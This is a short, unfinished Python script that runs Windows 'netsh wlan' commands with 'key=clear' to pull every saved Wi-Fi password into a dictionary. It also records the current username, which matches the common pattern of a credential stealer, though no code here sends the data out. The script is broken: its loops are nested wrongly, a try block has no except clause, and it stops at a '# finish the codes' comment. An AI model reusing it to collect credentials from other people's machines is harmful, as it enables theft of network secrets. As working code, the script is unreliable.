
import subprocess

import os
username = os.getlogin() 
wifi_data = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8") 
wifi_data_to_str = wifi_data.split("\n") 
profiles = [] 
passwords = {}
for profile in wifi_data_to_str: 
    if "All User Profile" in profile:
         profile = profile.split(":")[1].strip() 
         profiles.append(profile)
    for profile in profiles:
        try:
             wifi_data_profile = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode("utf-8")
             wifi_data_profile_to_str = wifi_data_profile.split("\n")
             password = "No password found" 
             for line in wifi_data_profile_to_str:
                 if "Key Content" in line:
                    password = line.split(":")[1].strip() 
                    break 
                 passwords[profile] = password 

            # finish the codes
                
